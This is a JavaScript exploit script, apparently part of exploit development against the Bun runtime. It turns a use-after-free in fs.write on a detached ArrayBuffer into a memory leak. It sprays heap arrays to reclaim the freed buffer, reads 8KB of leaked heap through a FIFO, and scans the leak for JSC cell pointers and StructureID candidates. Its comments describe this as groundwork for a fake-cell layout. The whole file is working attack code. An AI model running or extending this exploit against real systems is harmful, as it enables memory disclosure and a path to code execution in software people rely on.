// Wide-byte memory disclosure built on the leak side of the BufferSource UAF.
//
// fs-uaf-object-ref-roundtrip.js's leak side already reads 8192 bytes of the
// reclaimed butterfly via fs.write into a FIFO. We were only consuming 8
// bytes (the JSCell* at offset 144). That same 8KB transcript contains
// enough surrounding memory to (a) confirm the inter-anchor stride, (b)
// recover a candidate StructureID for the spray array's element type, and
// (c) leak any stable JSC values placed in the butterfly by JSC itself
// (vectorLength / publicLength headers, etc.).
//
// This does NOT yet build a fake-cell layout. It hands the caller a hex
// dump of the entire 8KB transcript and a list of u64-aligned values that
// look like JSCell pointers (top 16 bits zero, bit 1 zero, value in JSC
// heap range), so we can pick StructureID candidates by inspection.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const size = Number(process.env.BUF_SIZE || 8192);
const slots = Number(process.env.SLOTS || 1024);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || 1 << 20);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const dumpStart = Number(process.env.DUMP_START || 96);
const dumpLen = Number(process.env.DUMP_LEN || 256);

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}
function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}
function makeFifo(label) {
  const path = join(tmpdir(), `bun-uaf-wleak-${label}-${process.pid}-${Math.random().toString(36).slice(2, 8)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}
function closeFifo(f) {
  for (const fd of [f.writeFd, f.fillFd, f.readFd]) { try { fs.closeSync(fd); } catch {} }
  try { fs.unlinkSync(f.path); } catch {}
}
function isAgain(e) { return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK"; }
function fillFifo(f) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(f.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (e) {
      if (isAgain(e)) break;
      throw e;
    }
  }
  if (filled === 0) throw new Error("fifo fill failed");
  return filled;
}
async function readExact(f, n, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, n)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < n) {
    try {
      const got = fs.readSync(f.readFd, scratch, 0, Math.min(scratch.length, n - total), null);
      if (got > 0) { chunks.push(Buffer.from(scratch.subarray(0, got))); total += got; continue; }
    } catch (e) { if (!isAgain(e)) throw e; }
    if (Date.now() >= deadline) throw new Error(`timed out ${label}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}
function readU64LE(buf, off) {
  let v = 0n;
  for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(buf[off + i]);
  return v;
}

const anchors = Array.from({ length: 64 }, (_, i) => ({ kind: "anchor", i }));

async function leakWide() {
  const fifo = makeFifo("wleak");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(size);
    const source = new Uint8Array(ab);
    source.fill(0x51);
    const done = new Promise((r) => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bw) => r({ err, bw }));
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < sprayCount; i++) {
      const arr = new Array(slots);
      for (let j = 0; j < slots; j++) arr[j] = anchors[(i + j) & 63];
      retained.push(arr);
    }
    gcNow();
    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, size, "wide leak");
    await done;
    return leaked;
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

const leaked = await leakWide();

// Print a focused window of the transcript so we can see the structure
// before, at, and after the canonical anchor offset 144.
const window = leaked.subarray(dumpStart, Math.min(leaked.length, dumpStart + dumpLen));
const hex = window.toString("hex");
const lines = [];
for (let i = 0; i < window.length; i += 16) {
  const chunk = window.subarray(i, i + 16);
  lines.push(`${(dumpStart + i).toString(10).padStart(5, " ")}  ${chunk.toString("hex").padEnd(32, " ")}`);
}

// Pull out u64-aligned values across the whole transcript that look like
// JSC heap pointers. Top 16 bits zero, bit 1 zero, value > 0x1000_0000_0000.
function isCellShaped(v) {
  return (v >> 48n) === 0n && (v & 0x2n) === 0n && v >= 0x0000100000000000n;
}
const cellPointers = [];
for (let off = 0; off + 8 <= leaked.length; off += 8) {
  const v = readU64LE(leaked, off);
  if (isCellShaped(v)) cellPointers.push({ off, v });
}

// Group consecutive equal-pointer runs to estimate the JSObject IsoSubspace
// stride and whether the spray got tightly packed.
const runs = [];
let cur = null;
for (const { off, v } of cellPointers) {
  if (cur && cur.bits === v && cur.start + cur.length * 8 === off) {
    cur.length++;
  } else {
    if (cur) runs.push(cur);
    cur = { start: off, length: 1, bits: v };
  }
}
if (cur) runs.push(cur);

console.log("hex_dump:");
for (const l of lines) console.log("  " + l);
console.log("");
console.log("first_runs:");
const top = runs.slice(0, 16).map((r) => ({
  start: r.start,
  length: r.length,
  bits: `0x${r.bits.toString(16).padStart(16, "0")}`,
}));
for (const r of top) console.log("  " + JSON.stringify(r));

// Look at offsets 0..143 for non-cell-shaped 4- or 8-byte tokens; those are
// candidates for vectorLength / publicLength / structureID-bearing bytes.
const headerCandidates = [];
for (let off = 0; off + 4 <= 144; off += 4) {
  const b0 = leaked[off];
  const b1 = leaked[off + 1];
  const b2 = leaked[off + 2];
  const b3 = leaked[off + 3];
  const u32 = (b0 | (b1 << 8) | (b2 << 16) | (b3 << 24)) >>> 0;
  if (u32 !== 0 && u32 < 0x100000) headerCandidates.push({ off, u32: `0x${u32.toString(16)}` });
}
console.log("");
console.log("u32_header_candidates:");
for (const h of headerCandidates) console.log("  " + JSON.stringify(h));
